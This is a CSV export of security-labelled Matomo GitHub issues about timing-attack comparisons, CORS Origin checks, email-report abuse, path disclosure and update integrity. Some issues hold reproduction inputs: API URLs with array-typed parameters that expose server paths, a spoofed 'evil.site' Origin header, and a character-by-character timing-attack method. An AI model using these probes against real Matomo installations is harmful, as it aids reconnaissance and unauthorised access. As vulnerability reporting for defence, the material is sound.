repository,number,title,description,comments,is_pr,labels
matomo-org/matomo,124434256,"Preventing timing attacks on authentication","### Background

See http://codahale.com/a-lesson-in-timing-attacks/. Also, Github [advises](https://developer.github.com/webhooks/securing/#validating-payloads-from-github) using constant-time string comparison with its authentication token.
### Issue

The `authenticateWithToken()` and `authenticateWithTokenOrHashToken()` functions of the Login plugin (see https://github.com/piwik/piwik/blob/2.16.0-b1/plugins/Login/Auth.php#L72-L96) currently don't use a constant-time string comparison when checking validity of `token_auth`.

Specifically:
1. `authenticateWithTokenOrHashToken()`: Following comparisons are not constant-time:
   - `SessionInitializer::getHashTokenAuth($login, $user['token_auth']) === $token`
   - `$user['token_auth'] === $token`
2. `authenticateWithToken()`: I'm not familiar with DB access, but it seems possible that `$user = $this->userModel->getUserByTokenAuth($token)` is not constant-time, referring to the comparison by MySQL of `$token` to table entries on value search (requested in https://github.com/piwik/piwik/blob/2.16.0-b1/plugins/UsersManager/Model.php#L175).

~~Note: `authenticateWithPassword()` does not seem to be affected, because it compares hashes of the password. Which should make such character-by-character recovery impossible, given that a hash changes entirely with a slightest change of the password.~~_(See next comment.)_
### Possible Solutions:
1. `authenticateWithTokenOrHashToken()`: See, e.g., https://github.com/phpseclib/phpseclib/blob/2.0.0/phpseclib/Crypt/RSA.php#L2201-L2213 for an example on constant-time string comparison. (Its length check should not be an issue with `token_auth` in Piwik, since it's a (MD5) hash, whose length is constant and thus does not contain any information useful to an attacker.) ~~Alternatively, see next point.~~
   
   Another secure string comparison example can be found here: https://github.com/defuse/php-encryption/blob/399fc4c4798b301681888c2608b0ddd060d477da/src/Crypto.php#L409.

~~2. `authenticateWithToken()`: A solution could be storing the `token_auth` in hashed form, similarly to the password. And similarly, hashing the received value before searching for it in the DB.~~_(See next comment.)_
### Additional Notes

It seems to be very hard to exploit this with a web application (especially over the internet). So that this is rather an ""enhancement"". E.g., following test:

```
$time_start = microtime(true);

for ( $i = 0; $i < 1000000; ++$i )
{
   $results = strcmp('stringstring', 'stringstring');
}

$time_end = microtime(true);
printf(""strcmp with matching strings took %f seconds\n"", $time_end - $time_start);

$time_start = microtime(true);

for ( $i = 0; $i < 1000000; ++$i )
{
   $results = strcmp('stringstring', 'weoisdfd');
}

$time_end = microtime(true);
printf(""strcmp with non-matching strings took %f seconds\n"", $time_end - $time_start);

$time_start = microtime(true);

for ( $i = 0; $i < 1000000; ++$i )
{
   $results = 'stringstring' === 'stringstring';
}

$time_end = microtime(true);
printf(""=== with matching strings took %f seconds\n"", $time_end - $time_start);

$time_start = microtime(true);

for ( $i = 0; $i < 1000000; ++$i )
{
   $results = 'stringstring' === 'weoisdfd';
}

$time_end = microtime(true);
printf(""=== with non-matching strings took %f seconds\n"", $time_end - $time_start);
```

on http://sandbox.onlinephpfunctions.com/ outputs, e.g., following with PHP 5.0.5:

```
strcmp with matching strings took 0.411142 seconds
strcmp with non-matching strings took 0.393982 seconds
=== with matching strings took 0.192044 seconds
=== with non-matching strings took 0.172884 seconds
```

~~I.e., a difference of ca. 20ms per 1000000 comparisons, or ca. 20ns per comparison with `===`.~~_(See next comment.)_

With PHP 5.6.2 it's faster, but the difference is similar, e.g.:

```
strcmp with matching strings took 0.246002 seconds
strcmp with non-matching strings took 0.236303 seconds
=== with matching strings took 0.047865 seconds
=== with non-matching strings took 0.023867 seconds
```

P.S.: I'm not an expert with any of the above, in any way shape or form :)
","Having thought about this issue a bit more, **here is an extension/update to the original post:**

### Issue

Here are additional points. (Points 1 and 2 of the original post are still valid.)

  `3.` Unlike stated above, the `authenticateWithPassword()` function (see https://github.com/piwik/piwik/blob/2.16.0-b1/plugins/Login/Auth.php#L61-L70) is also affected on its check of `$user['password'] === $passwordHash`.
  The reason is that the currently used MD5 hash function is [very broken](https://en.wikipedia.org/wiki/MD5#Security), as can be any hash function in future. To ""break in"", an attacker would need:
- Try any string as password, making sure that the string's hash value does not change in the already recovered characters.
- Make sure that the tried string's length stays the same between the tries, so that its hash calculation time stays constant.
  
  Now, that last point makes the attack much more difficult (if not almost impossible), because it's one thing to find a collision with strings of any length, and a completely different one to do so with strings of equal length. Still, there is a theoretical possibility (the longer the strings, the easier), and hash functions only get more broken over time.
  
  Please note that:
- The attacker would not need to recover the actual password, but just a string whose hash value equals (i.e. collides with) the hash value of the password.
- Addition of a salt to the password would make no difference for a timing attack. Because a salt just changes the hash value compared against.

`4.` `isTokenValid()` on **password reset token** (https://github.com/piwik/piwik/blob/2.16.0-b1/plugins/Login/PasswordResetter.php#L234) is not constant-time on its check of `$generatedToken === $token`.

`5.` `verifyNonce()` on **nonce** (https://github.com/piwik/piwik/blob/2.16.0-b1/core/Nonce.php#L76) is not constant-time on its check of `$cnonce !== $nonce`.

`6.` `validatePhoneNumber()` on **phone number verification** (https://github.com/piwik/piwik/blob/2.16.0-b1/plugins/MobileMessaging/API.php#L273) is not constant-time on its check of `$verificationCode == $phoneNumbers[$phoneNumber]`.

`7.` `setIgnoreCookie()` on **ignore cookie setting** (https://github.com/piwik/piwik/blob/2.16.0-b1/plugins/UsersManager/Controller.php#L302) is not constant-time on its check of `$salt !== $this->getIgnoreCookieSalt()`.

### Possible Solutions
1. `authenticateWithTokenOrHashToken()`:
   1. Either: Same as in the original post.
   2. Or: https://github.com/piwik/piwik/issues/9457 (which is similar to point 3.ii. below).
2. `authenticateWithToken()`: This point in the original post is wrong. An additional hash round would not make a difference (assuming that hashing is a constant-time operation) - it would just change the hash value compared against. Instead, a solution could be:
   1. ~~Either: An addition of an artificial random time jitter, to overlay the DB search time. One with a resolution in the area of the DB search time difference due to the non-constant comparison.~~ _(See next comment.)_
   2. Or: Same as 1.ii. above.
3. `authenticateWithPassword()`:
   1. Either: Same as in point 1.i. above.
   2. Or: https://github.com/piwik/piwik/issues/5728#issuecomment-162944909.
      It uses `password_verify()` which is [safe against timing attacks](https://secure.php.net/manual/en/function.password-verify.php). It requires PHP 5 >= 5.5.0, which should be fine for Piwik 3.0 (https://github.com/piwik/piwik/issues/8156).
4. `isTokenValid()`: Same as in point 1.i. above.
5. `verifyNonce()`: Same as in point 1.i. above.
6. `validatePhoneNumber()`: Same as in point 1.i. above.
7. `setIgnoreCookie()`: Same as in point 1.i. above.

### Additional Notes

The test in the original post was not correct, in that the comparison time difference of only one character should be tested:

```
$time_start = microtime(true);

for ( $i = 0; $i < 1000000; ++$i )
{
   $results = 'aa' === 'ab';
}

$time_end = microtime(true);
printf(""=== with matching strings took %f seconds\n"", $time_end - $time_start);

$time_start = microtime(true);

for ( $i = 0; $i < 1000000; ++$i )
{
   $results = 'aa' === 'bb';
}

$time_end = microtime(true);
printf(""=== with non-matching strings took %f seconds\n"", $time_end - $time_start);
```

Which outputs following with PHP 5.0.5:

```
=== with matching strings took 0.188403 seconds
=== with non-matching strings took 0.183385 seconds
```

I.e., a difference of ca. 5ms per 1000000 comparisons, or ca. 5ns per comparison. And about half of that with PHP 5.6.2.

Which makes this even more theoretical in the realm of web applications (especially over the Internet).
The above solution 2.i. (time jitter ""padding"" of the comparison time) would not work. It would make an attack slower, but not prevent it. Because of a possibility of a statistical analysis attack. Paraphrasing https://www.reddit.com/r/netsec/comments/3zc5qu/https_bicycle_attack/cylek82:

If you were to observe enough samples, you'd eventually identify a case where the random time padding length reached its minimum, which would give you a close estimate of the actual comparison time.

For example, if you say ""padding time is randomly selected between 5 and 50 ns, with a resolution of 5ns"", after 10 observations you can assume that the actual comparison time is probably 5ns shorter than the smallest comparison time you observed. Your confidence factor only goes up with the number of observations.
From another discussion, from 2010, [Nanosecond Scale Remote Timing Attacks On PHP Applications: Time To Take Them Seriously?](https://web.archive.org/web/20150906004145/http://blog.astrumfutura.com/2010/10/nanosecond-scale-remote-timing-attacks-on-php-applications-time-to-take-them-seriously/):

> Throw in possible situation improvements (for an attacker) due to CPU/RAM constraints, increased sampling and analysis, and we now have something a heck of a lot more worrying. The real possibility [is] that our network jitter defence is dead in the water â€“ the gulf between a 1ns memcmp() comparison and a 15ns detection resolution no longer looks insurmountable.

It even advocates for timing attack prevention on **user name (""login"")** (which is, similarly to the issue point 2 above, also vulnerable on its DB look-up in https://github.com/piwik/piwik/blob/2.16.0-b1/plugins/Login/Auth.php#L63):

> It has long been noted by programmers that, where usernames are not explicitly public by design, disclosing usernames indirectly is a problem. If nothing else it increases the risk of cross referencing username/password combinations from other more seriously compromised websites. We all use a different password for every single site, donâ€™t we?

But, in my opinion (given its implementation complexity), that would not be needed with a timing attack-secure password handling.
A method was added in https://github.com/matomo-org/matomo/pull/16696 and documented it in the checklist and security guide plus it's a public API. we'll only need to use it in the codebase eventually",no,"c: Security,"
matomo-org/matomo,104426717,"do not allow to set access to non existing websites","As a Super User, currently I can set user access to websites that don't exist yet.

Reproduce:
- go to: http://localhost.com/piwik-master/index.php?date=yesterday&module=API&format=json&method=UsersManager.setUserAccess&period=day&userLogin=user1&access=view&idSites=1,4,2,5&token_auth=xyz
- when setting permission by setting idSites = non existent values (eg. `4,5`)  the user will get access to non existing sites. When these new sites will be added t,he user will have access already on these new websites.
- Expected: it should not be possible to assign access to a website that does not yet exist.

reported by Haseeb 
",,no,"c: Security,"
matomo-org/matomo,452436369,"rate limit scheduled email reports","Email reports in Matomo can be abused to send many emails. For example by creating a scheduled email report, then adding a few dozens (or more) email addresses (for example fake, or real), and then clicking ""Send Report Now"". The email report will be sent to all email addresses. The button can be clicked again and again. This fake email can be triggered every day as well. 

Somehow it would be good to implement rate limiting. But not sure how the rate limiting should work... 

See also https://github.com/matomo-org/matomo/issues/13813","Maybe an even better (even though complexer to implement) solution would be to require an opt-in for all emails (similar to https://github.com/matomo-org/matomo/issues/13533)

So if you add an email to a report, it only gets added after the user clicked on a confirmation link.",no,"Major,c: Security,"
matomo-org/matomo,1207536963,"`POST` to `matomo.php` Endpoint Returns 204 When Setting An `Origin` Header Not On The `cors_domains`","According to the documentation [in the Matomo FAQ](https://matomo.org/faq/how-to/faq_18694/), CORS settings can be set by setting the `cors_domains` array in the `config.ini.php` to only allow certain domains to interact.  However even if this is set, when sending a `POST` request to the `matomo.php` endpoint with a domain in the `Origin` request header that is not on the list still returns a `204` instead of an error.

## Expected Behavior
When the `Origin` request header is set to a URL not on the list, the response should be some sort of `4xx` response.

## Current Behavior
Response is a `204`

## Possible Solution
Set behavior to return a `401` in this instance

## Steps to Reproduce (for Bugs)
1. Set a value in `cors_domains` in the `config.ini.php` to your domain.
2. Verify these values on the `System` -> `General Settings` page under the `Cross-Origin Resource Sharing (CORS) domains` section.
3. Send a `POST` request to the `/matomo.php` endpoint with the `Origin` header set to a value not in the `cors_domains` array (for example, `https://evil.site`
4. Observe response is `204`.

## Context
This bug could allow malicious actors to hit endpoints from environments outside the allowed websites.


## Your Environment

<!-- Include as many relevant details about the environment you experienced the bug in -->
<!-- You can find some of that information in the system check -->
* Matomo Version: `4.9.0`
* PHP Version: `8.0.17`
* Server Operating System: Linux (using Matomo docker container `4.0.9-apache`)
* Additionally installed plugins: None
* Browser: Observed in Chrome `100.0.4896.127` and using Postman
* Operating System: Mac OS X
","@Zozman thanks for the bug report, I think that's a bug I made in this PR, https://github.com/matomo-org/matomo/pull/19030.  

Here should be instead of `*`, I believe should be a combination of `cors_domains` and sites domains in the database. ping @sgiehl 

https://github.com/matomo-org/matomo/blob/dc753b2fc6e691d0830ec03143ae06c091474296/core/Tracker.php#L119
should we assign this issue to the 5.0 milestone, since it's breaking changes?I'm not sure. Thinking of tracking I'm wondering if 204 is maybe actually the correct response since the tracking request was processed and we would want to avoid that because of https://github.com/matomo-org/matomo/blob/4.10.1/js/piwik.js#L2843-L2850 we would retry that tracking request.

A 204 would describe exactly above. Request was executed but no response/content.

AFAIK when sending a tracking request and there is a CORS error then the request itself was still executed. It's only that the response wasn't readable for the client. So we'd want to make sure to not send every tracking request twice.
I guess that depends on the expectation. I would actually also assume that a configured cors domain would also disallow requests coming from other origins. In that case it would be correct to send a `403 Forbidden`. We then would need to handle the 403 in another way in tracking js for sure.You can see this in the examples on https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS as well that these send HTTP 2XX (200 and 204) headers. And the browsers decided if the client can read the response.

Also

> CORS failures result in errors but for security reasons, specifics about the error are not available to JavaScript. All the code knows is that an error occurred. The only way to determine what specifically went wrong is to look at the browser's console for details.

<img width=""813"" alt=""image"" src=""https://user-images.githubusercontent.com/273120/172851607-8eae8eb5-5885-477f-a3df-64dad4b53991.png"">

The browser console already shows correctly when a CORS error happens 
<img width=""1466"" alt=""image"" src=""https://user-images.githubusercontent.com/273120/172851903-2fca8d7f-66f0-4d81-895d-4ea84dbf0d0b.png"">



",no,"c: Security,Regression,"
matomo-org/matomo,333223420,"Encourage strong passwords by indicating when passwords are weak (and when password don't match)","I think it'd be helpful for the admin to have the following dynamic (JS-driven) indicators, just like WordPress:

- Indicator for weak passwords
- Indicator for when passwords don't match","That could also be added in admin when changing the own password or creating new usersThanks for the suggestion, it would be great & valuable to encourage users to create strong passwords. 

Maybe we could create+link to a FAQ on Matomo.org explaining that it's important to use password managers, and store the encrypted database on a backed up drive.

Regarding the indicator when password don't match... maybe we could even remove the need to type the password twice, and only have the password field once? As long as people have a valid email address in their profile they can easily reset the password if there was a typo.You could also include a most popular password list and throw an error if the entered password appears in thereI'm moving this to 3.7 as it has a huge security benefit. (move it back, if you have planned it for a later release)
I also like @tsteur's idea of rejecting (or at least warning about) common password.
Maybe this could even be combined with the new have-i-been-pawned api:
https://haveibeenpwned.com/API/v2#PwnedPasswordsMoving it back to the backlog as it currently doesn't have a priority.I disagree with my old post above. I don't think (anymore) that a password strength indicator has a huge security benefit. 
For stopping terrible passwords the plugins in https://github.com/matomo-org/matomo/issues/13666 are enough. 

And any indicator is either incorrect or too simplified or ends up replicating Dropbox's zxcvbn which is too huge for frontend. And one can already easily write a plugin that validates submitted plugins with it. ",no,"Enhancement,c: Security,c: Usability,"
matomo-org/matomo,359244903,"When exporting data and ""Show export URL"" is clicked, don't reveal the full token_auth ","The new feature ""Show export URL"" is very valuable in giving everyone quick access to the API and seeing how the URL is constructed, making it easy to share, etc.

However for security reasons we would not want to reveal the full token_auth on screen. 
Similarly in the Personal settings page where the `token_auth` is displayed to the user, it requires an extra click to reveal the full token. 

So the goal if this issue is to slightly change the behavior, proposal:
* When ""Show export URL"" is clicked, show the textarea but in the string, only show the first few characters and write `...`.
* When user clicks the field to copy/paste it, then reveal the full token_auth and full URL

follows up #11958 #12987","Is this really needed considering you already have to click to see it? Just tested and noticed that currently you need to click, and then double click to select the string. Ideally on the first click to reveal the full URL then the full URL would be selected and then user can copy. it would be more usable.

But an even more secure / usable solution could be maybe:

* The full token_auth is never displayed on screen, and instead it shows the full URL and replaces `token_auth=full_token_here` by `token_auth=start_tok***********`
* on click on the textarea, the value is copied into the clipboard
* and a feedback ""Copied to your clipboard!"" is displayed

Not showing the token_auth on screen would be a security improvement as the token can be easily seen/recorded by someone viewing the screen.I won't be working on this, so unassigning myself. I don't agree with any of the flows. Even the original in the issue.is there maybe a better way not to show the token_auth on screen? anyway it's not urgent for now so removing from milestoneEither you have only a ""copy url"" link, or you simply show it directly on ""show export url"" and accept the fact how Matomo works currently and eventually it'll be refactored to have proper authentication in place. Also when you paste a URL in the address bar, it will show the end of the URL which is usally the token. Next, a more likely risk than screen recording is that users send the exported URL to other people. Ideally you neither show them the URL nor let them copy the URL. Then when we POST to export the URL, the token won't be in the URL at all and will neither appear in access logs.",no,"c: Security,"
matomo-org/matomo,91337459,"security guideline for documentation","I read more and more insecure recommendations in documentation.

I guess the whole documentation needs to be assessed in terms of security.

In respect to software deployment, there's few basic rules that seem important to me:
- Any Software Downloads need to be integrity and origin checked
- Any web server uploads need to be integrity and target checked
- As many files as possible need to be read-only to webserver user (e. g. www-data)
- Any vHost needs to be seperated (one vHost script may not read Files of another vHost).
- Any database needs to be password secured (with no insecure ports open)
- [...]

On Piwik documentation, it already starts insecure: http://piwik.org/docs/installation/#getting-started

```
Before you get started, ensure that you have the following: [...]
    - Access to your web server (via shell or FTP)
    - A FTP Client (if you are installing Piwik on a remote server)
```

I would like to read something about SSH here. Even FTPS has limitations (potentially just encrypting credentials). And there's a difference to SFTP/SCP.

```
Download the latest release Piwik from http://builds.piwik.org/piwik.zip
```

Yes, MITM brings his virus in and we install it on our webservers. With https, this would be _ways_ more secure. Users would not even notice it. HTTPS-Version https://builds.piwik.org/piwik.zip is already available, so why not use it? Just add an ""s""...

```
Open your FTP client [...]
If you have SSH access to your server, you can use it instead of FTP as it is much faster
```

Not just faster, also _ways_ more secure! But wait, why not download piwik directly from the webserver via shell using a secured https connection? This could also be worked around with a tiny PHP script downloading and extracting the installation files if users don't have shell access (still not the best option as it has similar limitations as before).

```
When Piwik is uploaded you can move on to the next step!
```

Did we miss the integrity check? Where's the SHA-x/MD5-Hashsum I should check? Where can I get hashsums _safely_? Keep in mind MITM can also compromise MD5-hashsums when he can compromise a download. If the download link is http, then at least the hashsum should be https.

How is made sure, that most of the files are read-only in the context of the web server (www-data), if users want to update without the web frontend's automatic update. This looks ways too dangerous to me, anyways. Sure, people love it...

```
If you do not have the database information, you may need to ask your web host or technical staff.
```

In many cases this is right. I'm just missing the information that empty passwords can be painful here.

Also consider #7519. You need a security guideline for documentation!

I'm sure we'd see great improvements in the code after that is done! (e.g. https-piwik-api instead of http-piwik-api in default config).

Don't get me wrong. The current documentation is always the easiest way for users, which is good in some way. But I guess most of them don't know what they do when following these recommendations. They should be warned at least if they do insecure stuff.

Now I'm also wondering how you work internally. Do you upload builds via FTP to the piwik web space?

Plus, security related documentation should be https-only. MITM could easily downgrade security level of documentation otherwise (at least if users expect valid https).

Always keep in mind that attackers _will_ use every possibility as soon as they figure out how. E.g. attacks like https://blog.sucuri.net/2015/06/magento-platform-targeted-by-credit-card-scrapers.html

Related: #1867 dating back to 2010...
",":+1: 
I'm also missing the integrity check (SHA-x/MD5-Hashsum), so ðŸ‘ for this issue.",no,"c: Website matomo.org,c: Security,"
matomo-org/matomo,1125047930,"Don't suggest a chown root:root","Did an update via console core:update. Was doing it as root, as ... yeah, bash of www-data isn't that functional :) Anyway, got that message at the end:

```
It appears you have executed this update with user root:root, while your Matomo files are owned by www-data:www-data. 

To ensure that the Matomo files are readable by the correct user, you may need to run the following command (or a similar command depending on your server configuration):

$ chown -R root:root /var/www/piwik/piwik
```

Of course, I just copied and executed that command, as it looked ok. Then I figured out, that Matomo doesn't want to run anymore, so I did a chown with www-data:www-data.

I suggest to think about that hint. Not entirely sure wether it's more likely that the files are usually owned by the correct user and it should be assumed that this is correct or there should be a simple check like ""something will break with root ownership for sure"".","Thanks for mentioning this @e7o-de 

It will also fix https://github.com/matomo-org/matomo/issues/17862 and will close that issue as a duplicate.

I think in this example we could adjust the wording and mention that the command may be executed using the wrong user and not only suggest the chown command to prevent such cases. If the user is `root` we could also mention specifically that this is likely executed with wrong user.Possibly we could also prompt user at the start if they aren't using the same user as the files are owned with to make sure they want to continue.",no,"Bug,c: Security,Better processes,"
matomo-org/matomo,1109902266,"When setting up two factor authentication (2FA), don't show the QR code right away","Ideally we would hide it at first, and have a link to make it visible. This way in case you have people around you, you can send them away first.

The link to click to make it visible would need to very obvious, otherwise it's easy to get lost.",,no,"c: Security,"
matomo-org/matomo,538797554," SecureHash is not secure ","As reported by @Findus23 

Not really a vulnerability in itself, but also not secure and might cause issues if someone uses the function without checking in the future. Therefore, I want to document it here.

The function generateSecureHash here is really not secure:

https://github.com/matomo-org/matomo/blob/e92247972a99092eb300bcbc163492542017d1b5/plugins/Login/PasswordResetter.php#L305

It hashes the string with $this->hashData which again calls Common::hash which uses the whirlpool hash which is fast and not intended for cryptographic use cases.

The splitting of data is just distraction as with 50000000 Hashes per second on a simple GTX 1060 Ti there is no need to store rainbowtables.

I guess there is no reason to not use the secure slow hashes used for passwords also for password reset tokens.","Seems to me we could just update the hashData function as follows and it will then use the Password::preferredAlgorithm() hash.

```
    protected function hashData($data)
    {
        return $this->passwordHelper->hash($data);
    }
```

If that makes sense I can toss in a PR pretty quick.Thanks @mwithheld that'd be great if you fired up a PR for this.Assuming the password reset hash should be secure and reproducible, how about using something like is used here:

```
namespace Piwik\Session\SaveHandler;
...
class DbTable
{
...
    const TOKEN_HASH_ALGO = 'sha512';
    ...
    private function hashSessionId($id)
    {
        $salt = SettingsPiwik::getSalt();
        return hash(self::TOKEN_HASH_ALGO, $id . $salt);
    }
```
For better security than sha512, we could choose another algorithm from the [hash_algos()](https://www.php.net/manual/en/function.hash.php) list, e.g. sha3-512.  A [speed comparison is here](https://www.php.net/manual/en/function.hash.php#124509), and an [output length comparison is here](https://www.php.net/manual/en/function.hash.php#124917).

Proof of concept at [https://onecompiler.com/php/3xbpcw5xn](https://onecompiler.com/php/3xbpcw5xn)Guess adding a more secure hashing for the reset token would be fine that way",no,"Help wanted,c: Security,"
matomo-org/matomo,366818301,"Require email verification when changing email address.","Related to https://github.com/matomo-org/matomo/issues/2932 and https://github.com/matomo-org/matomo/issues/6125 (the latter could maybe also be added in the same change)

At the moment every Matomo user could change their E-Mail address to everything they want without any verification (apart from syntax, see https://github.com/matomo-org/matomo/issues/11796). This allows every Matomo user to send an unlimited amount of (for them) SPAM E-Mails to anyone without them ever opting in to receiving them.

When someone tries to change their email address (after confirming their password; https://github.com/matomo-org/matomo/issues/2932) the change should only be saved if the user was able to confirm an link in a sent mail. 
In addition an email should be sent to the old email address informing them that they are loosing access to the account (and to inform an admin if they don't know about the change)
https://github.com/matomo-org/matomo/issues/6125","Slightly refs https://github.com/matomo-org/matomo/issues/13321 :) @tsteur  The only issue I forgot to cross-link :slightly_smiling_face: ",no,"c: Security,c: Usability,"
matomo-org/matomo,37354295,"Prevent path disclosure, automatically hide path from warning messages and backtraces","Path disclosure results to a little piece of information disclosure, the path at which piwik is setup. We better not give out the information even though it is not a problem in itself, it can be used when other attack vectors would be available. Also many users report the bug and it would reduce email traffic and overhead.

The idea would be to automatically remove the path from the error messages, backtraces, in the custom error /exception handler. We could still display the path when the Super User is logged in, just because it would help making things clear.

But for anonymous or view/admin, we should replace the path with empty string.
","from email

```
a[]=
/index.php?a[]=0&b=0&format=xml&method=ExampleAPI.getSum&module=API&token_auth=anonymous
Fatal error: Unsupported operand types in
/home/piwik-demo/www/demo.piwik.org/plugins/ExampleAPI/API.php on line
100
---------------------
b[]=
/index.php/index.php?a=0&b[]=0&format=xml&method=ExampleAPI.getSum&module=API&token_auth=anonymous
Fatal error: Unsupported operand types in
/home/piwik-demo/www/demo.piwik.org/plugins/ExampleAPI/API.php on line
100
----------------------
date[]=
/index.php?action=getEvolutionGraph&columns=revenue&date[]=1&evolutionBy=revenue&idSite=2&idsite=2&module=MultiSites&period=day&viewDataTable=sparkline
Fatal error: Call to a member function toString() on a non-object in
/www2/htdocs/piguik/core/Archive.php on
line 262
----------------------
fontSize[]=
/index.php?aliasedGraph=1&apiAction=getCountry&apiModule=UserCountry&date=last10&fontSize[]=9&format=rss&idSite=2&legendAppendMetric=1&method=ImageGraph.get&module=API&outputType=0&period=day&showLegend=1&token_auth=anonymous&translateColumnNames=
Fatal error: Unsupported operand types in
/www2/htdocs/piguik/plugins/ImageGraph/API.php
on line 163

```
",no,"Task,c: Security,"
matomo-org/matomo,773694921,"Stop tracking Matomo installation IP/URL/Details","I love Matomo and how it complies to GDPR for my visitors....

BUT:  why would you track my server ip, url and installation details during your Version checking?

in /plugins/CoreUpdater/ReleaseChannel.php you add these params:
```
'piwik_version'   => Version::VERSION,
'php_version'     => PHP_VERSION,
'mysql_version'   => Db::get()->getServerVersion(),
'release_channel' => $this->getId(),
'url'             => Url::getCurrentUrlWithoutQueryString(),
'trigger'         => Common::getRequestVar('module', '', 'string'),
'timezone'        => API::getInstance()->getDefaultTimezone()
```

Now I get why you would like to track that info to get to know your user-base... I would like to know more about my visitors too, but I just cannot do that without their consent.

In my humble opinion, it would be better to have the options (apart from maybe piwik_version) optional and only added when the installer asks for consent and the admin/installer/maintainer agrees.
","Thanks for creating the issue. So far you can disable this tracking by disabling automatic update checks: configure the setting `enable_auto_update = 0` within the `[General]` section of your `config/config.ini.php file`.",no,"c: Security,c: Privacy,"
matomo-org/matomo,114489389,"Send an email / text when there is a fail login attempt","We should at least optionally notify a user when there is a failed login attempt. I'd have it enabled by default in core but we could also have it as a plugin on the marketplace or by default disabled.

We'd send an email to the owner of the account letting the user know someone tried to log in using his login name. Maybe we'd also add IP address etc? I'm sure there are many examples for this on the internet. 

We could also only send it after the second or third failed attempt. 

It is a bit related to brute force attack but not really: https://github.com/piwik/piwik/issues/2888
","Nice idea! Maybe a good idea as a first step before #2888 
sound's great!
maybe one should think of sending this mail not always but only after e.g. 3rd failed login attempted?
on the other hand one could extend this to send a mail when some logs in from an other country than the last time (or similar)?
putting the IP in the email would be great - maybe one could reuse geoIP feature
> We'd send an email to the owner of the account letting the user know someone tried to log in using his login name. 

I think superadmin/admin should be made aware too... There's something ""fishy"" after more than 5 attempts...
Good point re other country. I'll create a separate issue for this. They might be developed both in one step at some point but better to have them separated. 
If text messages are configured in a Piwik (eg for scheduled reports) one should ideally also be able to receive it as a text message on your phone to be able to react quickly in case it wasn't you who tried to log in...
I think https://github.com/piwik/piwik/issues/2888 is more valuable first (althrough of course also more complicated to implement)
Just FYI: When an attacker brute forces tokens, no user can be notified as there is only the token and no username. As an attacker, I would not bother about trying to log in through username/password but instead through the API which also avoids needing the nonce etc.

Maybe a simple solution for https://github.com/matomo-org/matomo/issues/2888 is more useful for now?Just seeing #2888 is scheduled for 3.7.0 as well :) FYI: Now that we will have #2888 I will move it out of this milestone. It wouldn't be that valuable when a user can still try to log in through token_auth and basically nobody would get notified. Also it could result in heaps of mails.### hey guys , is there a way to report an ip address that tried to access , my account ? 

the login attempt happened , just after my : 

> user.device_verification_requested | user.login | user.device_verification_success!   

Is there a way that the attacker , tracked my `""user.device_verification_success""` 

cause the attack happened at the same day , just after I did , the `""user.device_verification_success"" `

### Is there a Way to Resolve this ? .... & thanks  

",no,"c: Security,c: New plugin,"
matomo-org/matomo,63101706,"Check for updates over HTTPS","At @mattab's suggestion:

> The check for new version is done over HTTP so far. that's maybe an issue, so feel free to create a new issue for that

See concern here: https://github.com/piwik/piwik/issues/6441#issuecomment-82743149
","I think this can be closed because Matomo already does try to use HTTPS when supported on the server-side. See https://github.com/matomo-org/matomo/blob/2ac2bc1aeaf8efce6bb9af92506311da99e1757f/plugins/Marketplace/config/config.php#L8-L16",no,"Task,c: Security,"
matomo-org/matomo,44435643,"Create a Secure Mode that removes some features from Piwik to increase security ","A Super User has a lot of power and with it comes a lot of responsibility. The goal of this issue is to create a new config setting eg. `secure_mode` that is disabled by default. When enabled it will limit some of the powers of Super Users.

In particular it will prevent:
- uploading custom plugin via .zip upload 
  - create a new config setting for this
- installing plugin from the marketplace
  - set config setting: `enable_marketplace=0`
- Super User seeing other users `token_auth`
  -  set config setting in #6346 

Possibly there are other insecure items that a Super User could do that we want to limit in the secure mode?
",,no,"Enhancement,c: Security,c: Platform,"
matomo-org/matomo,59442979,"When downloading latest Piwik core release, check the PGP signature","Follows up #6441

When we download the latest piwik release over HTTPS, we could also check that the PGP signature is valid. 

Note: not sure how it would work or if it's even possible, but there you go
","(Deleted my previous message, there's a better way.)

You can do verification with the `openssl` command. For example, here's how I manually verify Sparkle updates:

```
sparkleVerify() {
    ARCHIVE=""$1""
    DSAPEM=""$2""
    SIGB64=""$3""
    # echo ""Verifying $ARCHIVE signature $SIGB64 with key: $DSAPEM""
    SIGFILE=$(mktemp -t sig)
    echo -n ""$SIGB64"" | base64 -D > ""$SIGFILE""
    openssl dgst -sha1 -binary ""$ARCHIVE"" | openssl dgst -dss1 -verify ""$DSAPEM"" -signature ""$SIGFILE""
}
```
If you're curious as to how to actually create the keys and the signatures, [look at how Sparkle does it](https://github.com/sparkle-project/Sparkle/tree/master/bin). If you use this method then verification will work with the example I gave above.
Checking PGP signatures in plugins downloaded from Marketplace is covered in https://github.com/piwik/piwik/issues/11909 See also details on how WP does it: https://paragonie.com/blog/2019/05/wordpress-5-2-mitigating-supply-chain-attacks-against-33-internet",no,"Task,c: Security,"
matomo-org/matomo,1207699609,"Once the cors_domains is set apply cors_domains list to the prefight cors","### Description:

Fixes: #19116
Once the cors_domains are set apply the cors_domains list to the prefight cors. By default, it allows all. Maybe we should use the `getAllKnownUrlsForAllSites()` array + cors_domains as the whitelist array. 

### Review

* [ ] [Functional review done](https://developer.matomo.org/guides/pull-request-reviews#functional-review-done)
* [ ] [Potential edge cases thought about](https://developer.matomo.org/guides/pull-request-reviews#potential-edge-cases-thought-about) (behavior of the code with strange input, with strange internal state or possible interactions with other Matomo subsystems)
* [ ] [Usability review done](https://developer.matomo.org/guides/pull-request-reviews#usability-review-done) (is anything maybe unclear or think about anything that would cause people to reach out to support)
* [ ] [Security review done](https://developer.matomo.org/guides/security-in-piwik#checklist)
* [ ] [Wording review done](https://developer.matomo.org/guides/pull-request-reviews#translations-wording-review-done)
* [ ] [Code review done](https://developer.matomo.org/guides/pull-request-reviews#code-review-done)
* [ ] [Tests were added if useful/possible](https://developer.matomo.org/guides/pull-request-reviews#tests-were-added-if-usefulpossible)
* [ ] [Reviewed for breaking changes](https://developer.matomo.org/guides/pull-request-reviews#reviewed-for-breaking-changes)
* [ ] [Developer changelog updated if needed](https://developer.matomo.org/guides/pull-request-reviews#developer-changelog-updated-if-needed)
* [ ] [Documentation added if needed](https://developer.matomo.org/guides/pull-request-reviews#documentation-added-if-needed)
* [ ] Existing documentation updated if needed
